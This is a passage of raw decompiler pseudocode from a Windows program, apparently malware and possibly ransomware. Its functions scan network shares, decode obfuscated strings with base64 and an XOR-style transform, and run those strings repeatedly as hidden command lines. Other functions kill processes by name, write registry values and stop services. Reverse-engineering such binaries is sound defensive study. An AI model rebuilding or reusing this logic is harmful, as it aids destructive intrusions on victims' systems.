  v4 = (*(int (__thiscall **)(char *))(*(_DWORD *)v9 + 8))(v9);
  LOBYTE(v14) = 0;
  if ( v9 )
  {
    v5 = v8;
    LOBYTE(v5) = v9 != v8;
    (*(void (__stdcall **)(char *))(*(_DWORD *)v9 + 16))(v5);
    v9 = 0;
  }
  result = sub_40A0F0(v11, v4);
  v14 = -1;
  return result;
}
// 40F6A0: using guessed type _DWORD _guard_check_icall_nop();
// 49DE9C: using guessed type int (__stdcall *___7___Func_impl_no_alloc_V_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__3__Z_X__V_std__6B_[2])(int);

//----- (0040C140) --------------------------------------------------------
void __cdecl __noreturn sub_40C140(void *a1)
{
  void *v1; // eax
  _DWORD *v2; // edx
  int v3; // ecx

  v1 = sub_40C330(a1);
  sub_40BBD0(v2, (int)v1);
  terminate(v3);
}
// 40C150: variable 'v2' is possibly undefined
// 40C155: variable 'v3' is possibly undefined
// 46203B: using guessed type void __thiscall __noreturn terminate(_DWORD);

//----- (0040C160) --------------------------------------------------------
_DWORD *__thiscall sub_40C160(_DWORD *Block, char a2)
{
  volatile signed __int32 *v3; // edi

  *Block = &___7___PPLTaskHandle_EU___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__U_TaskProcHandle_details_3__details_Concurrency__6B_;
  v3 = (volatile signed __int32 *)Block[2];
  if ( v3 )
  {
    if ( !_InterlockedExchangeAdd(v3 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v3)(v3);
      if ( !_InterlockedDecrement(v3 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v3 + 4))(v3);
    }
  }
  *Block = &Concurrency::details::_TaskProcHandle::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 40F6A0: using guessed type _DWORD _guard_check_icall_nop();
// 49DE04: using guessed type int (__thiscall *___7___PPLTaskHandle_EU___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__U_TaskProcHandle_details_3__details_Concurrency__6B_)(void *Block, char);
// 49DE5C: using guessed type void *Concurrency::details::_TaskProcHandle::`vftable';

//----- (0040C200) --------------------------------------------------------
_DWORD *__thiscall sub_40C200(_DWORD *Block, char a2)
{
  volatile signed __int32 *v3; // edi

  *Block = &___7___PPLTaskHandle_EU___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__U_TaskProcHandle_details_3__details_Concurrency__6B_;
  v3 = (volatile signed __int32 *)Block[2];
  if ( v3 )
  {
    if ( !_InterlockedExchangeAdd(v3 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v3)(v3);
      if ( !_InterlockedDecrement(v3 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v3 + 4))(v3);
    }
  }
  *Block = &Concurrency::details::_TaskProcHandle::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 40F6A0: using guessed type _DWORD _guard_check_icall_nop();
// 49DE04: using guessed type int (__thiscall *___7___PPLTaskHandle_EU___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__U_TaskProcHandle_details_3__details_Concurrency__6B_)(void *Block, char);
// 49DE5C: using guessed type void *Concurrency::details::_TaskProcHandle::`vftable';

//----- (0040C2A0) --------------------------------------------------------
int __thiscall sub_40C2A0(int this)
{
  int v2; // eax
  unsigned __int8 v3; // bl
  int v4; // eax
  struct _Mtx_internal_imp_t *v6; // [esp+Ch] [ebp-10h]

  v6 = (struct _Mtx_internal_imp_t *)(this + 20);
  v2 = _Mtx_lock((_Mtx_t)(this + 20));
  if ( v2 )
    std::_Throw_C_error(v2);
  if ( *(_DWORD *)(this + 4) == 2 )
  {
    v3 = 0;
  }
  else
  {
    *(_DWORD *)(this + 4) = 1;
    v3 = 1;
  }
  v4 = _Mtx_unlock(v6);
  if ( v4 )
    std::_Throw_C_error(v4);
  return v3;
}

//----- (0040C330) --------------------------------------------------------
void *__thiscall sub_40C330(void *this)
{
  return this;
}

//----- (0040C340) --------------------------------------------------------
void ***sub_40C340()
{
  return &___R0_AV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__2__Z__8;
}
// 4FD870: using guessed type void **___R0_AV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__2__Z__8;

//----- (0040C350) --------------------------------------------------------
int __thiscall sub_40C350(int **this)
{
  return sub_40B790(this[1]);
}

//----- (0040C360) --------------------------------------------------------
_DWORD *__thiscall sub_40C360(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = ___7___Func_impl_no_alloc_V_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__3__Z_X__V_std__6B_;
  a2[1] = this[1];
  return result;
}
// 49DE9C: using guessed type int (__stdcall *___7___Func_impl_no_alloc_V_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__3__Z_X__V_std__6B_[2])(int);

//----- (0040C380) --------------------------------------------------------
char __fastcall sub_40C380(_DWORD *a1, char *a2)
{
  _DWORD *v2; // edi
  char *v3; // eax
  int v4; // esi
  _DWORD *v5; // esi
  int v6; // eax
  int v7; // edx
  int v8; // ebx
  int v10; // [esp+Ch] [ebp-Ch]
  unsigned __int16 v11; // [esp+10h] [ebp-8h]

  v2 = a1;
  v3 = a2;
  v4 = a1[4];
  if ( v4 != *((_DWORD *)a2 + 4) )
    return 0;
  if ( *((_DWORD *)a2 + 5) >= 8u )
    v3 = *(char **)a2;
  if ( a1[5] >= 8u )
    a1 = (_DWORD *)*a1;
  v5 = (_DWORD *)((char *)a1 + 2 * v4);
  if ( v2[5] >= 8u )
    v2 = (_DWORD *)*v2;
  if ( v2 != v5 )
  {
    v6 = v3 - (char *)v2;
    v10 = v6;
    do
    {
      v7 = *(unsigned __int16 *)v2;
      v11 = *(_WORD *)((char *)v2 + v6);
      if ( (_WORD)v7 != v11 )
      {
        v8 = toupper(v7);
        if ( v8 != toupper(v11) )
          return 0;
        v6 = v10;
      }
      v2 = (_DWORD *)((char *)v2 + 2);
    }
    while ( v2 != v5 );
  }
  return 1;
}

//----- (0040C420) --------------------------------------------------------
bool __fastcall sub_40C420(HKEY hKey, const WCHAR *lpSubKey, LPCWSTR lpValueName, BYTE *lpData)
{
  const BYTE *v4; // esi
  bool v5; // bl
  bool v6; // zf
  const WCHAR *v7; // edi
  HKEY phkResult; // [esp+Ch] [ebp-8h] BYREF

  v4 = lpData;
  v5 = 0;
  v6 = *((_DWORD *)lpSubKey + 4) == 0;
  v7 = lpValueName;
  phkResult = hKey;
  if ( !v6 && *((_DWORD *)lpValueName + 4) && *((_DWORD *)lpData + 4) )
  {
    if ( *((_DWORD *)lpSubKey + 5) >= 8u )
      lpSubKey = *(const WCHAR **)lpSubKey;
    if ( !RegCreateKeyW(hKey, lpSubKey, &phkResult) )
    {
      if ( *((_DWORD *)lpData + 5) >= 8u )
        v4 = *(const BYTE **)lpData;
      if ( *((_DWORD *)lpValueName + 5) >= 8u )
        v7 = *(const WCHAR **)lpValueName;
      v5 = RegSetValueExW(phkResult, v7, 0, 1u, v4, 2 * *((_DWORD *)lpData + 4)) == 0;
      RegCloseKey(phkResult);
    }
  }
  return v5;
}

//----- (0040C4B0) --------------------------------------------------------
void **__fastcall sub_40C4B0(void **Src, _DWORD *a2)
{
  int v3; // ebx
  unsigned int v4; // esi
  int v5; // ecx
  _DWORD *v6; // eax
  unsigned int v7; // ecx
  _DWORD *v8; // eax
  unsigned __int8 v9; // bl
  _DWORD *v10; // eax
  size_t v11; // ecx
  unsigned int i; // esi
  void **v13; // ebx
  void *v14; // eax
  char v15; // al
  unsigned int v16; // esi
  char v17; // bl
  unsigned int v18; // ecx
  unsigned int v19; // edx
  _DWORD *v20; // eax
  unsigned int j; // eax
  size_t v22; // ecx
  unsigned int v23; // eax
  char *v24; // eax
  void **v25; // ebx
  char v26; // al
  void *v27; // eax
  char v28; // al
  unsigned int v29; // eax
  unsigned int v30; // esi
  char v31; // bl
  unsigned int v32; // ecx
  unsigned int v33; // edx
  _DWORD *v34; // eax
  int v37; // [esp+18h] [ebp-24h]
  _DWORD *v38; // [esp+1Ch] [ebp-20h]
  unsigned int v39; // [esp+1Ch] [ebp-20h]
  char v40; // [esp+20h] [ebp-1Ch]
  char v41; // [esp+21h] [ebp-1Bh]
  char v42; // [esp+22h] [ebp-1Ah]
  char v43; // [esp+24h] [ebp-18h] BYREF
  unsigned __int8 v44; // [esp+25h] [ebp-17h]
  unsigned __int8 v45; // [esp+26h] [ebp-16h]
  char v46; // [esp+27h] [ebp-15h]
  char v47[4]; // [esp+28h] [ebp-14h]
  char v48[4]; // [esp+2Ch] [ebp-10h]
  int v49; // [esp+38h] [ebp-4h]

  v38 = a2;
  *(_DWORD *)v48 = Src;
  v3 = 0;
  v4 = 0;
  v5 = a2[4];
  *(_DWORD *)(*(_DWORD *)v48 + 16) = 0;
  Src[5] = (void *)15;
  v37 = 0;
  *(_BYTE *)Src = 0;
  v49 = 0;
  if ( v5 )
  {
    do
    {
      v6 = a2;
      *(_DWORD *)v48 = v5 - 1;
      v7 = a2[5];
      if ( v7 >= 0x10 )
        v6 = (_DWORD *)*a2;
      if ( *((_BYTE *)v6 + v3) == 61 )
        break;
      v8 = a2;
      if ( v7 >= 0x10 )
        v8 = (_DWORD *)*a2;
      v9 = *((_BYTE *)v8 + v3);
      if ( !sub_4624C4(v9) && v9 != 43 && v9 != 47 )
        break;
      a2 = v38;
      v10 = v38;
      if ( v38[5] >= 0x10u )
        v10 = (_DWORD *)*v38;
      v3 = v37 + 1;
      *(&v43 + v4++) = *((_BYTE *)v10 + v37++);
      if ( v4 == 4 )
      {
        v11 = MaxCount;
        for ( i = 0; i < 4; ++i )
        {
          v13 = &Buf;
          if ( (unsigned int)dword_4F8A0C >= 0x10 )
            v13 = (void **)Buf;
          if ( v11 && (v14 = memchr(v13, *(&v43 + i), v11)) != 0 )
            v15 = (_BYTE)v14 - (_BYTE)v13;
          else
            v15 = -1;
          v11 = MaxCount;
          *(&v43 + i) = v15;
        }
        v40 = 4 * v43 + ((v44 >> 4) & 3);
        v41 = 16 * v44 + ((v45 >> 2) & 0xF);
        v16 = 0;
        v42 = v46 + (v45 << 6);
        do
        {
          v17 = *(&v40 + v16);
          v18 = (unsigned int)Src[4];
          v19 = (unsigned int)Src[5];
          v47[0] = v17;
          if ( v18 >= v19 )
          {
            sub_40D800(Src, 1u, (int)Src, v47[0]);
          }
          else
          {
            Src[4] = (void *)(v18 + 1);
            v20 = Src;
            if ( v19 >= 0x10 )
              v20 = *Src;
            *((_BYTE *)v20 + v18) = v17;
            *((_BYTE *)v20 + v18 + 1) = 0;
          }
          ++v16;
        }
        while ( v16 < 3 );
        a2 = v38;
        v4 = 0;
        v3 = v37;
      }
      v5 = *(_DWORD *)v48;
    }
    while ( *(_DWORD *)v48 );
    if ( v4 )
    {
      for ( j = v4; j < 4; ++j )
        *(&v43 + j) = 0;
      v22 = MaxCount;
      v23 = 0;
      v39 = 0;
      do
      {
        v24 = &v43 + v23;
        v25 = &Buf;
        *(_DWORD *)v48 = v24;
        if ( (unsigned int)dword_4F8A0C >= 0x10 )
          v25 = (void **)Buf;
        v26 = *v24;
        if ( v22 && (v27 = memchr(v25, v26, v22)) != 0 )
          v28 = (_BYTE)v27 - (_BYTE)v25;
        else
          v28 = -1;
        **(_BYTE **)v48 = v28;
        v22 = MaxCount;
        v23 = v39 + 1;
        v39 = v23;
      }
      while ( v23 < 4 );
      v40 = 4 * v43 + ((v44 >> 4) & 3);
      v29 = v4 - 1;
      v41 = 16 * v44 + ((v45 >> 2) & 0xF);
      v30 = 0;
      v42 = v46 + (v45 << 6);
      for ( *(_DWORD *)v47 = v29; v30 < *(_DWORD *)v47; ++v30 )
      {
        v31 = *(&v40 + v30);
        v32 = (unsigned int)Src[4];
        v33 = (unsigned int)Src[5];
        v48[0] = v31;
        if ( v32 >= v33 )
        {
          sub_40D800(Src, 1u, (int)Src, v48[0]);
        }
        else
        {
          Src[4] = (void *)(v32 + 1);
          v34 = Src;
          if ( v33 >= 0x10 )
            v34 = *Src;
          *((_BYTE *)v34 + v32) = v31;
          *((_BYTE *)v34 + v32 + 1) = 0;
        }
      }
    }
  }
  return Src;
}
// 4F8A0C: using guessed type int dword_4F8A0C;

//----- (0040C780) --------------------------------------------------------
int __usercall sub_40C780@<eax>(_DWORD *a1@<edx>, int a2@<ecx>, int a3@<ebp>)
{
  int v4; // edi
  void **v5; // ecx
  void **v6; // esi
  unsigned int v7; // edx
  char v8; // al
  void **v9; // ecx
  _DWORD *v10; // eax
  void *v11; // ecx
  void *v12; // ecx
  void *v13; // ecx
  _DWORD v15[5]; // [esp-68h] [ebp-74h] BYREF
  unsigned int v16; // [esp-54h] [ebp-60h]
  int v17; // [esp-50h] [ebp-5Ch]
  void **v18; // [esp-4Ch] [ebp-58h]
  void *v19[4]; // [esp-48h] [ebp-54h] BYREF
  int v20; // [esp-38h] [ebp-44h]
  unsigned int v21; // [esp-34h] [ebp-40h]
  char v22; // [esp-30h] [ebp-3Ch]
  void *v23[4]; // [esp-2Ch] [ebp-38h] BYREF
  unsigned int v24; // [esp-1Ch] [ebp-28h]
  unsigned int v25; // [esp-18h] [ebp-24h]
  int *v26; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v28; // [esp-8h] [ebp-14h]
  int v29; // [esp-4h] [ebp-10h]
  int v30; // [esp+0h] [ebp-Ch]
  int v31; // [esp+4h] [ebp-8h]
  int v32; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v30 = a3;
  v31 = retaddr;
  v29 = -1;
  v28 = &loc_482190;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v26 = &v32;
  v4 = a2;
  v17 = a2;
  v18 = (void **)a2;
  v24 = 0;
  v25 = 15;
  LOBYTE(v23[0]) = 0;
  sub_40A390(v23, (void *)Src, 0);
  v29 = 0;
  sub_40C4B0(v19, a1);
  LOBYTE(v29) = 1;
  v5 = v19;
  v6 = v19;
  if ( v21 >= 0x10 )
  {
    v5 = (void **)v19[0];
    v6 = (void **)v19[0];
  }
  v18 = (void **)((char *)v5 + v20);
  if ( v6 != (void **)((char *)v5 + v20) )
  {
    do
    {
      v7 = v24;
      v8 = (*(_BYTE *)v6 - 2) ^ 0x43;
      v22 = v8;
      if ( v24 >= v25 )
      {
        sub_40D800(v23, 1u, v17, v22);
      }
      else
      {
        ++v24;
        v9 = v23;
        if ( v25 >= 0x10 )
          v9 = (void **)v23[0];
        *((_BYTE *)v9 + v7) = v8;
        *((_BYTE *)v9 + v7 + 1) = 0;
      }
      v6 = (void **)((char *)v6 + 1);
    }
    while ( v6 != v18 );
    v4 = v17;
  }
  v10 = sub_405DB0(v15, (const CHAR *)v23);
  *(_DWORD *)(v4 + 16) = 0;
  *(_DWORD *)(v4 + 20) = 0;
  *(_OWORD *)v4 = *(_OWORD *)v10;
  *(_QWORD *)(v4 + 16) = *((_QWORD *)v10 + 2);
  v10[4] = 0;
  v10[5] = 7;
  *(_WORD *)v10 = 0;
  if ( v16 >= 8 )
  {
    v11 = (void *)v15[0];
    if ( 2 * v16 + 2 >= 0x1000 )
    {
      v11 = *(void **)(v15[0] - 4);
      if ( (unsigned int)(v15[0] - (_DWORD)v11 - 4) > 0x1F )
        goto LABEL_24;
    }
    sub_44775B(v11);
  }
  v15[4] = 0;
  v16 = 7;
  LOWORD(v15[0]) = 0;
  if ( v21 >= 0x10 )
  {
    v12 = v19[0];
    if ( v21 + 1 >= 0x1000 )
    {
      v12 = (void *)*((_DWORD *)v19[0] - 1);
      if ( (unsigned int)(v19[0] - v12 - 4) > 0x1F )
        goto LABEL_24;
    }
    sub_44775B(v12);
  }
  v20 = 0;
  v21 = 15;
  LOBYTE(v19[0]) = 0;
  if ( v25 >= 0x10 )
  {
    v13 = v23[0];
    if ( v25 + 1 < 0x1000 || (v13 = (void *)*((_DWORD *)v23[0] - 1), (unsigned int)(v23[0] - v13 - 4) <= 0x1F) )
    {
      sub_44775B(v13);
      return v4;
    }
LABEL_24:
    _invalid_parameter_noinfo_noreturn();
  }
  return v4;
}
// 40C780: could not find valid save-restore pair for ebp

//----- (0040C990) --------------------------------------------------------
char __stdcall sub_40C990(_DWORD *a1)
{
  _DWORD *v1; // ebx
  HANDLE Toolhelp32Snapshot; // edi
  char v3; // bl
  void *v4; // ecx
  HANDLE v5; // eax
  void *v6; // esi
  void *Block[5]; // [esp+10h] [ebp-250h] BYREF
  unsigned int v9; // [esp+24h] [ebp-23Ch]
  PROCESSENTRY32W pe; // [esp+28h] [ebp-238h] BYREF

  v1 = a1;
  if ( !a1[4] )
    return 0;
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
  if ( Toolhelp32Snapshot == (HANDLE)-1 )
    return 0;
  memset(&pe.cntUsage, 0, 0x228u);
  pe.dwSize = 556;
  if ( !Process32FirstW(Toolhelp32Snapshot, &pe) )
  {
LABEL_13:
    CloseHandle(Toolhelp32Snapshot);
    return 0;
  }
  while ( 1 )
  {
    Block[4] = 0;
    LOWORD(Block[0]) = 0;
    v9 = 7;
    sub_404330(Block, pe.szExeFile, wcslen(pe.szExeFile));
    v3 = sub_40C380(v1, (char *)Block);
    if ( v9 >= 8 )
    {
      v4 = Block[0];
      if ( 2 * v9 + 2 >= 0x1000 )
      {
        v4 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v4 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_44775B(v4);
    }
    if ( v3 )
    {
      v5 = OpenProcess(1u, 0, pe.th32ProcessID);
      v6 = v5;
      if ( v5 )
        break;
    }
    if ( !Process32NextW(Toolhelp32Snapshot, &pe) )
      goto LABEL_13;
    v1 = a1;
  }
  TerminateProcess(v5, 0);
  CloseHandle(v6);
  return 1;
}

//----- (0040D050) --------------------------------------------------------
char __stdcall sub_40D050(LPWSTR lpCommandLine)
{
  WCHAR *v1; // esi
  bool v2; // cf
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+8h] [ebp-64h] BYREF
  struct _STARTUPINFOW StartupInfo; // [esp+18h] [ebp-54h] BYREF

  v1 = lpCommandLine;
  if ( !*((_DWORD *)lpCommandLine + 4) )
    return 0;
  memset(&StartupInfo, 0, sizeof(StartupInfo));
  v2 = *((_DWORD *)lpCommandLine + 5) < 8u;
  ProcessInformation = 0i64;
  if ( !v2 )
    v1 = *(WCHAR **)lpCommandLine;
  if ( !CreateProcessW(0, v1, 0, 0, 1, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation) )
    return 0;
  WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
  CloseHandle(ProcessInformation.hThread);
  CloseHandle(ProcessInformation.hProcess);
  return 1;
}

//----- (0040D0F0) --------------------------------------------------------
void __stdcall sub_40D0F0(int a1)
{
  int i; // esi
  WCHAR *v2; // eax
  void *v3; // ecx
  WCHAR *v4; // eax
  void *v5; // ecx
  WCHAR *v6; // eax
  void *v7; // ecx
  WCHAR *v8; // eax
  void *v9; // ecx
  WCHAR *v10; // eax
  void *v11; // ecx
  WCHAR *v12; // eax
  void *v13; // ecx
  void *Block[5]; // [esp+8h] [ebp-18h] BYREF
  unsigned int v15; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  for ( i = 0; i < a1; ++i )
  {
    v2 = (WCHAR *)sub_40C780(&dword_4F8A28, (int)Block, (int)&savedregs);
    sub_40D050(v2);
    if ( v15 >= 8 )
    {
      v3 = Block[0];
      if ( 2 * v15 + 2 >= 0x1000 )
      {
        v3 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v3 - 4) > 0x1F )
LABEL_28:
          _invalid_parameter_noinfo_noreturn();
      }
      sub_44775B(v3);
    }
    v4 = (WCHAR *)sub_40C780(&dword_4F8A88, (int)Block, (int)&savedregs);
    sub_40D050(v4);
    if ( v15 >= 8 )
    {
      v5 = Block[0];
      if ( 2 * v15 + 2 >= 0x1000 )
      {
        v5 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v5 - 4) > 0x1F )
          goto LABEL_28;
      }
      sub_44775B(v5);
    }
    v6 = (WCHAR *)sub_40C780(&dword_4F8E30, (int)Block, (int)&savedregs);
    sub_40D050(v6);
    if ( v15 >= 8 )
    {
      v7 = Block[0];
      if ( 2 * v15 + 2 >= 0x1000 )
      {
        v7 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v7 - 4) > 0x1F )
          goto LABEL_28;
      }
      sub_44775B(v7);
    }
    v8 = (WCHAR *)sub_40C780(&dword_4F8E18, (int)Block, (int)&savedregs);
    sub_40D050(v8);
    if ( v15 >= 8 )
    {
      v9 = Block[0];
      if ( 2 * v15 + 2 >= 0x1000 )
      {
        v9 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v9 - 4) > 0x1F )
          goto LABEL_28;
      }
      sub_44775B(v9);
    }
    v10 = (WCHAR *)sub_40C780(&dword_4F8A58, (int)Block, (int)&savedregs);
    sub_40D050(v10);
    if ( v15 >= 8 )
    {
      v11 = Block[0];
      if ( 2 * v15 + 2 >= 0x1000 )
      {
        v11 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v11 - 4) > 0x1F )
          goto LABEL_28;
      }
      sub_44775B(v11);
    }
    v12 = (WCHAR *)sub_40C780(&dword_4F8C20, (int)Block, (int)&savedregs);
    sub_40D050(v12);
    if ( v15 >= 8 )
    {
      v13 = Block[0];
      if ( 2 * v15 + 2 >= 0x1000 )
      {
        v13 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v13 - 4) > 0x1F )
          goto LABEL_28;
      }
      sub_44775B(v13);
    }
  }
}

//----- (0040D300) --------------------------------------------------------
char __stdcall sub_40D300(LPCWSTR lpServiceName, DWORD dwMilliseconds)
{
  const WCHAR *v2; // esi
  SC_HANDLE v3; // eax
  SC_HANDLE v4; // edi
  unsigned int v5; // edx
  SC_HANDLE hSCObject; // [esp+8h] [ebp-38h]
  DWORD TickCount; // [esp+Ch] [ebp-34h]
  char v9; // [esp+13h] [ebp-2Dh]
  BYTE Buffer[16]; // [esp+14h] [ebp-2Ch] BYREF
  __int128 v11; // [esp+24h] [ebp-1Ch]
  int v12; // [esp+34h] [ebp-Ch]
  DWORD pcbBytesNeeded; // [esp+38h] [ebp-8h] BYREF

  v2 = lpServiceName;
  v9 = 0;
  TickCount = GetTickCount();
  if ( *((_DWORD *)lpServiceName + 4) )
  {
    v3 = OpenSCManagerW(0, 0, 0xF003Fu);
    hSCObject = v3;
    if ( v3 )
    {
      if ( *((_DWORD *)lpServiceName + 5) >= 8u )
        v2 = *(const WCHAR **)lpServiceName;
      v4 = OpenServiceW(v3, v2, 0x2Cu);
      if ( v4 )
      {
        v12 = 0;
        pcbBytesNeeded = 0;
        *(_OWORD *)Buffer = 0i64;
        v11 = 0i64;
        if ( QueryServiceStatusEx(v4, SC_STATUS_PROCESS_INFO, Buffer, 0x24u, &pcbBytesNeeded)
          && *(_DWORD *)&Buffer[4] != 1 )
        {
          if ( *(_DWORD *)&Buffer[4] == 3 )
          {
            do
            {
              v5 = DWORD2(v11) / 0xA;
              if ( DWORD2(v11) / 0xA >= 0x3E8 )
              {
                if ( v5 > 0x2710 )
                  v5 = 10000;
              }
              else
              {
                v5 = 1000;
              }
